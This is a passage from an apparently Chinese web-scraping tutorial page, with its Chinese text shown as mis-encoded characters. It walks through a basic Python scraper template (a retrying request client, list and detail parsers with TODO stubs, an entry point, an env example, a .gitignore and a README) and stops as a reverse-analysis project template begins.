        <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">DEFAULT_HEADERS</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">request</span><span class="p">(</span>
        <span class="bp">self</span><span class="p">,</span>
        <span class="n">method</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
        <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
        <span class="o">**</span><span class="n">kwargs</span>
    <span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="n">requests</span><span class="o">.</span><span class="n">Response</span><span class="p">]:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        å‘é€ HTTP è¯·æ±‚ï¼ˆå¸¦é‡è¯•ï¼‰</span>

<span class="sd">        Args:</span>
<span class="sd">            method: HTTP æ–¹æ³• (GET, POST, etc.)</span>
<span class="sd">            url: è¯·æ±‚ URL</span>
<span class="sd">            **kwargs: å…¶ä»–è¯·æ±‚å‚æ•°</span>

<span class="sd">        Returns:</span>
<span class="sd">            Response å¯¹è±¡æˆ– None</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="k">for</span> <span class="n">attempt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">MAX_RETRIES</span><span class="p">):</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="c1"># åˆå¹¶ä»£ç†é…ç½®</span>
                <span class="k">if</span> <span class="n">PROXIES</span><span class="p">:</span>
                    <span class="n">kwargs</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s1">&#39;proxies&#39;</span><span class="p">,</span> <span class="n">PROXIES</span><span class="p">)</span>

                <span class="c1"># è®¾ç½®è¶…æ—¶</span>
                <span class="n">kwargs</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s1">&#39;timeout&#39;</span><span class="p">,</span> <span class="n">REQUEST_TIMEOUT</span><span class="p">)</span>

                <span class="c1"># å‘é€è¯·æ±‚</span>
                <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="n">method</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
                <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>

                <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;è¯·æ±‚æˆåŠŸ: </span><span class="si">{</span><span class="n">method</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2"> - </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="k">return</span> <span class="n">response</span>

            <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;è¯·æ±‚å¤±è´¥ (å°è¯• </span><span class="si">{</span><span class="n">attempt</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">MAX_RETRIES</span><span class="si">}</span><span class="s2">): </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

                <span class="k">if</span> <span class="n">attempt</span> <span class="o">&lt;</span> <span class="n">MAX_RETRIES</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">RETRY_DELAY</span> <span class="o">*</span> <span class="p">(</span><span class="n">attempt</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">logger</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;è¯·æ±‚æœ€ç»ˆå¤±è´¥: </span><span class="si">{</span><span class="n">method</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                    <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="n">requests</span><span class="o">.</span><span class="n">Response</span><span class="p">]:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;GET è¯·æ±‚&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">post</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="n">requests</span><span class="o">.</span><span class="n">Response</span><span class="p">]:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;POST è¯·æ±‚&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">sleep</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;éšæœºä¼‘çœ &quot;&quot;&quot;</span>
        <span class="n">sleep_time</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">*</span><span class="n">SLEEP_INTERVAL</span><span class="p">)</span>
        <span class="n">logger</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ä¼‘çœ  </span><span class="si">{</span><span class="n">sleep_time</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2"> ç§’&quot;</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">sleep_time</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">save_json</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="n">Any</span><span class="p">,</span> <span class="n">Any</span><span class="p">],</span> <span class="n">filename</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¿å­˜ JSON æ•°æ®&quot;&quot;&quot;</span>
        <span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
        <span class="n">filepath</span> <span class="o">=</span> <span class="n">PROCESSED_DATA_DIR</span> <span class="o">/</span> <span class="n">filename</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">json</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">ensure_ascii</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>

        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;æ•°æ®å·²ä¿å­˜: </span><span class="si">{</span><span class="n">filepath</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">save_csv</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">list</span><span class="p">,</span> <span class="n">filename</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä¿å­˜ CSV æ•°æ®&quot;&quot;&quot;</span>
        <span class="kn">import</span><span class="w"> </span><span class="nn">csv</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
            <span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&quot;æ²¡æœ‰æ•°æ®å¯ä¿å­˜&quot;</span><span class="p">)</span>
            <span class="k">return</span>

        <span class="n">filepath</span> <span class="o">=</span> <span class="n">PROCESSED_DATA_DIR</span> <span class="o">/</span> <span class="n">filename</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">newline</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">writer</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">DictWriter</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">fieldnames</span><span class="o">=</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span>
            <span class="n">writer</span><span class="o">.</span><span class="n">writeheader</span><span class="p">()</span>
            <span class="n">writer</span><span class="o">.</span><span class="n">writerows</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;æ•°æ®å·²ä¿å­˜: </span><span class="si">{</span><span class="n">filepath</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s2"> æ¡)&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="5-scraperstarget_scraperpy">5. scrapers/target_scraper.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ç›®æ ‡ç½‘ç«™çˆ¬è™«</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">.base_scraper</span><span class="w"> </span><span class="kn">import</span> <span class="n">BaseScraper</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">config.settings</span><span class="w"> </span><span class="kn">import</span> <span class="n">TARGET_URL</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">config.logging</span><span class="w"> </span><span class="kn">import</span> <span class="n">logger</span>


<span class="k">class</span><span class="w"> </span><span class="nc">TargetScraper</span><span class="p">(</span><span class="n">BaseScraper</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ç›®æ ‡ç½‘ç«™çˆ¬è™«&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">base_url</span> <span class="o">=</span> <span class="n">TARGET_URL</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">scrape_list</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">page</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">1</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        æŠ“å–åˆ—è¡¨é¡µ</span>

<span class="sd">        Args:</span>
<span class="sd">            page: é¡µç </span>

<span class="sd">        Returns:</span>
<span class="sd">            åˆ—è¡¨æ•°æ®</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/list?page=</span><span class="si">{</span><span class="n">page</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">response</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">[]</span>

        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>
        <span class="n">items</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="c1"># TODO: å®ç°å…·ä½“çš„è§£æé€»è¾‘</span>
        <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">select</span><span class="p">(</span><span class="s1">&#39;.item&#39;</span><span class="p">):</span>
            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">item</span><span class="o">.</span><span class="n">select_one</span><span class="p">(</span><span class="s1">&#39;.title&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span>
                <span class="s1">&#39;link&#39;</span><span class="p">:</span> <span class="n">item</span><span class="o">.</span><span class="n">select_one</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)[</span><span class="s1">&#39;href&#39;</span><span class="p">],</span>
                <span class="c1"># æ·»åŠ æ›´å¤šå­—æ®µ...</span>
            <span class="p">}</span>
            <span class="n">items</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;é¡µé¢ </span><span class="si">{</span><span class="n">page</span><span class="si">}</span><span class="s2"> æŠ“å–åˆ° </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">items</span><span class="p">)</span><span class="si">}</span><span class="s2"> æ¡æ•°æ®&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">items</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">scrape_detail</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        æŠ“å–è¯¦æƒ…é¡µ</span>

<span class="sd">        Args:</span>
<span class="sd">            url: è¯¦æƒ…é¡µ URL</span>

<span class="sd">        Returns:</span>
<span class="sd">            è¯¦æƒ…æ•°æ®</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">response</span><span class="p">:</span>
            <span class="k">return</span> <span class="kc">None</span>

        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>

        <span class="c1"># TODO: å®ç°å…·ä½“çš„è§£æé€»è¾‘</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span>
            <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">soup</span><span class="o">.</span><span class="n">select_one</span><span class="p">(</span><span class="s1">&#39;h1&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span>
            <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="n">soup</span><span class="o">.</span><span class="n">select_one</span><span class="p">(</span><span class="s1">&#39;.content&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span>
            <span class="c1"># æ·»åŠ æ›´å¤šå­—æ®µ...</span>
        <span class="p">}</span>

        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;è¯¦æƒ…é¡µæŠ“å–æˆåŠŸ: </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">data</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start_page</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">end_page</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">10</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        è¿è¡Œçˆ¬è™«</span>

<span class="sd">        Args:</span>
<span class="sd">            start_page: èµ·å§‹é¡µ</span>
<span class="sd">            end_page: ç»“æŸé¡µ</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;å¼€å§‹æŠ“å–: é¡µé¢ </span><span class="si">{</span><span class="n">start_page</span><span class="si">}</span><span class="s2"> åˆ° </span><span class="si">{</span><span class="n">end_page</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

        <span class="n">all_items</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">start_page</span><span class="p">,</span> <span class="n">end_page</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
            <span class="c1"># æŠ“å–åˆ—è¡¨</span>
            <span class="n">items</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">scrape_list</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
            <span class="n">all_items</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">items</span><span class="p">)</span>

            <span class="c1"># ä¼‘çœ </span>
            <span class="bp">self</span><span class="o">.</span><span class="n">sleep</span><span class="p">()</span>

        <span class="c1"># ä¿å­˜æ•°æ®</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">save_json</span><span class="p">(</span><span class="n">all_items</span><span class="p">,</span> <span class="s1">&#39;list_data.json&#39;</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">save_csv</span><span class="p">(</span><span class="n">all_items</span><span class="p">,</span> <span class="s1">&#39;list_data.csv&#39;</span><span class="p">)</span>

        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;æŠ“å–å®Œæˆ: å…± </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">all_items</span><span class="p">)</span><span class="si">}</span><span class="s2"> æ¡æ•°æ®&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="6-mainpy">6. main.py</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ä¸»ç¨‹åºå…¥å£</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">scrapers.target_scraper</span><span class="w"> </span><span class="kn">import</span> <span class="n">TargetScraper</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">config.logging</span><span class="w"> </span><span class="kn">import</span> <span class="n">logger</span>


<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä¸»å‡½æ•°&quot;&quot;&quot;</span>
    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;çˆ¬è™«ç¨‹åºå¯åŠ¨&quot;</span><span class="p">)</span>
    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># åˆ›å»ºçˆ¬è™«å®ä¾‹</span>
        <span class="n">scraper</span> <span class="o">=</span> <span class="n">TargetScraper</span><span class="p">()</span>

        <span class="c1"># è¿è¡Œçˆ¬è™«</span>
        <span class="n">scraper</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">start_page</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">end_page</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>

        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;çˆ¬è™«ç¨‹åºç»“æŸ&quot;</span><span class="p">)</span>
        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>

    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="n">logger</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s2">&quot;ç”¨æˆ·ä¸­æ–­ç¨‹åº&quot;</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">logger</span><span class="o">.</span><span class="n">exception</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;ç¨‹åºå¼‚å¸¸: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre>
      </div>

      <h3 id="7-envexample">7. .env.example</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä»£ç†é…ç½®</span>
<span class="nv">USE_PROXY</span><span class="o">=</span><span class="nb">false</span>
<span class="nv">PROXY_URL</span><span class="o">=</span>http://127.0.0.1:7890

<span class="c1"># æ•°æ®åº“é…ç½®</span>
<span class="nv">MONGODB_URI</span><span class="o">=</span>mongodb://localhost:27017/
<span class="nv">MONGODB_DB</span><span class="o">=</span>scraper_db
<span class="nv">MONGODB_COLLECTION</span><span class="o">=</span>data

<span class="c1"># Redis é…ç½®</span>
<span class="nv">REDIS_HOST</span><span class="o">=</span>localhost
<span class="nv">REDIS_PORT</span><span class="o">=</span><span class="m">6379</span>
<span class="nv">REDIS_DB</span><span class="o">=</span><span class="m">0</span>
<span class="nv">REDIS_PASSWORD</span><span class="o">=</span>

<span class="c1"># æ—¥å¿—çº§åˆ«</span>
<span class="nv">LOG_LEVEL</span><span class="o">=</span>INFO
</code></pre>
      </div>

      <h3 id="8-gitignore">8. .gitignore</h3>

      <pre><code># Python
__pycache__/
*.py[cod]
*$py.class
*.so
.Python
env/
venv/
ENV/
build/
develop-eggs/
dist/
downloads/
eggs/
.eggs/
lib/
lib64/
parts/
sdist/
var/
wheels/
*.egg-info/
.installed.cfg
*.egg

# ç¯å¢ƒå˜é‡
.env
.env.local

# æ•°æ®å’Œæ—¥å¿—
data/
logs/
*.log

# IDE
.vscode/
.idea/
*.swp
*.swo
.DS_Store

# æµ‹è¯•
.pytest_cache/
.coverage
htmlcov/
</code></pre>

      <h3 id="9-readmemd">9. README.md</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="gh"># åŸºç¡€çˆ¬è™«é¡¹ç›®</span>

<span class="gu">## åŠŸèƒ½ç‰¹æ€§</span>

<span class="k">-</span><span class="w"> </span>âœ… å®Œæ•´çš„é¡¹ç›®ç»“æ„
<span class="k">-</span><span class="w"> </span>âœ… é…ç½®æ–‡ä»¶ç®¡ç†
<span class="k">-</span><span class="w"> </span>âœ… æ—¥å¿—ç³»ç»Ÿ (Loguru)
<span class="k">-</span><span class="w"> </span>âœ… é”™è¯¯é‡è¯•æœºåˆ¶
<span class="k">-</span><span class="w"> </span>âœ… ä»£ç†æ”¯æŒ
<span class="k">-</span><span class="w"> </span>âœ… æ•°æ®å­˜å‚¨ (JSON/CSV)
<span class="k">-</span><span class="w"> </span>âœ… ç¯å¢ƒå˜é‡é…ç½®

<span class="gu">## å¿«é€Ÿå¼€å§‹</span>

<span class="gu">### 1. å®‰è£…ä¾èµ–</span>

\`\`\`bash
pip install -r requirements.txt
\`\`\`

<span class="gu">### 2. é…ç½®ç¯å¢ƒ</span>

\`\`\`bash
cp .env.example .env
<span class="gh"># ç¼–è¾‘ .env æ–‡ä»¶</span>
\`\`\`

<span class="gu">### 3. è¿è¡Œçˆ¬è™«</span>

\`\`\`bash
python main.py
\`\`\`

<span class="gu">## é¡¹ç›®ç»“æ„</span>

\`\`\`
.
â”œâ”€â”€ config/          # é…ç½®æ–‡ä»¶
â”œâ”€â”€ scrapers/        # çˆ¬è™«æ¨¡å—
â”œâ”€â”€ utils/           # å·¥å…·å‡½æ•°
â”œâ”€â”€ data/            # æ•°æ®å­˜å‚¨
â”œâ”€â”€ logs/            # æ—¥å¿—æ–‡ä»¶
â””â”€â”€ main.py          # å…¥å£æ–‡ä»¶
\`\`\`

<span class="gu">## ä½¿ç”¨è¯´æ˜</span>

<span class="gu">### è‡ªå®šä¹‰çˆ¬è™«</span>

<span class="k">1.</span> ç¼–è¾‘ <span class="sb">`scrapers/target_scraper.py`</span>
<span class="k">2.</span> å®ç° <span class="sb">`scrape_list()`</span> å’Œ <span class="sb">`scrape_detail()`</span> æ–¹æ³•
<span class="k">3.</span> ä¿®æ”¹ <span class="sb">`config/settings.py`</span> ä¸­çš„ <span class="sb">`TARGET_URL`</span>

<span class="gu">### æ•°æ®å­˜å‚¨</span>

æ•°æ®é»˜è®¤ä¿å­˜åœ¨ <span class="sb">`data/processed/`</span> ç›®å½•ï¼š
<span class="k">-</span><span class="w"> </span>JSON æ ¼å¼: <span class="sb">`list_data.json`</span>
<span class="k">-</span><span class="w"> </span>CSV æ ¼å¼: <span class="sb">`list_data.csv`</span>

<span class="gu">### æ—¥å¿—æŸ¥çœ‹</span>

æ—¥å¿—ä¿å­˜åœ¨ <span class="sb">`logs/`</span> ç›®å½•ï¼š
<span class="k">-</span><span class="w"> </span>INFO æ—¥å¿—: <span class="sb">`info_YYYY-MM-DD.log`</span>
<span class="k">-</span><span class="w"> </span>ERROR æ—¥å¿—: <span class="sb">`error_YYYY-MM-DD.log`</span>

<span class="gu">## License</span>

MIT
\`\`\`

---

<span class="gu">## ğŸš€ ä½¿ç”¨æ­¤æ¨¡æ¿</span>

```bash
<span class="gh"># 1. å¤åˆ¶æ¨¡æ¿</span>
cp -r templates/basic_scraper my_project
cd my_project

<span class="gh"># 2. åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span>
python -m venv venv
source venv/bin/activate  # Linux/Mac
<span class="gh"># or</span>
venv\Scripts\activate  # Windows

<span class="gh"># 3. å®‰è£…ä¾èµ–</span>
pip install -r requirements.txt

<span class="gh"># 4. é…ç½®ç¯å¢ƒ</span>
cp .env.example .env
vim .env

<span class="gh"># 5. è¿è¡Œ</span>
python main.py
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³æ¨¡æ¿">ğŸ“š ç›¸å…³æ¨¡æ¿</h2>

      <ul>
        <li><a href="#09-Templates-reverse-project">é€†å‘åˆ†æé¡¹ç›®</a></li>
        <li><a href="#09-Templates-docker-setup">Docker éƒ¨ç½²</a></li>
        <li><a href="#09-Templates-distributed-crawler">åˆ†å¸ƒå¼çˆ¬è™«</a></li>
      </ul>

    </div>

    <div class="section" id="09-Templates-reverse-project">
      <h2>70. Reverse Project</h2>
      <h1 id="é€†å‘åˆ†æé¡¹ç›®æ¨¡æ¿">é€†å‘åˆ†æé¡¹ç›®æ¨¡æ¿</h1>

      <p>Web é€†å‘åˆ†æçš„æ ‡å‡†é¡¹ç›®æ¨¡æ¿ï¼Œå¸®åŠ©ä½ ç³»ç»ŸåŒ–åœ°è¿›è¡Œç½‘ç«™åˆ†æå’Œæ–‡æ¡£è®°å½•ã€‚</p>

      <hr />

      <h2 id="é¡¹ç›®ç»“æ„">ğŸ“ é¡¹ç›®ç»“æ„</h2>

      <pre><code>reverse_project/
